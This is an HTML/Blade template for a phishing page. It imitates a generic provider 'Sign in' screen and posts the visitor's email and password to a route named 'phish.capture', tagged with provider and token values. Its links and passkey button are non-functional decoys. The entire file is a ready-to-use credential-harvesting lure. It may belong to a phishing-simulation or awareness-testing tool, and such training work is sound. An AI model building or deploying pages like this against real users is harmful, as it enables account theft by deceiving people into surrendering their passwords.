<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 400px;
            padding: 40px 32px;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 28px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #333;
            margin-bottom: 6px;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #d0d0d0;
            border-radius: 6px;
            font-size: 15px;
            color: #1a1a1a;
            background: #fafafa;
            outline: none;
            transition: border-color 0.2s, background 0.2s;
            margin-bottom: 18px;
        }
        input:focus {
            border-color: #4a90d9;
            background: #fff;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #4a90d9;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }
        .btn-submit:hover {
            background: #3a7bc8;
        }
        .links {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
        }
        .links a {
            color: #4a90d9;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #999;
            font-size: 12px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e0e0e0;
        }
        .divider span {
            padding: 0 12px;
        }
        .btn-passkey {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #333;
            border: 1px solid #d0d0d0;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn-passkey:hover {
            background: #f5f5f5;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>Sign in</h1>
        <p class="subtitle">to continue to your account</p>

        <form method="POST" action="{{ route('phish.capture', ['provider' => $provider ?? 'generic', 'token' => $token ?? '']) }}">
            @csrf

            <label for="email">Email or phone</label>
            <input
                type="text"
                id="email"
                name="email"
                value="{{ $email ?? '' }}"
                autocomplete="username"
                required
                autofocus
            >

            <label for="password">Password</label>
            <input
                type="password"
                id="password"
                name="password"
                autocomplete="current-password"
                required
            >

            <button type="submit" class="btn-submit">Sign in</button>

            <div class="links">
                <a href="#">Forgot email?</a>
            </div>

            <div class="divider"><span>or</span></div>

            <button type="button" class="btn-passkey" onclick="return false;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2"/>
                    <path d="M7 11V7a5 5 0 0110 0v4"/>
                </svg>
                Sign in with passkey
            </button>
        </form>

        <div class="footer">
            <a href="#" style="color:#4a90d9; text-decoration:none;">Create account</a>
        </div>
    </div>
</body>
</html>
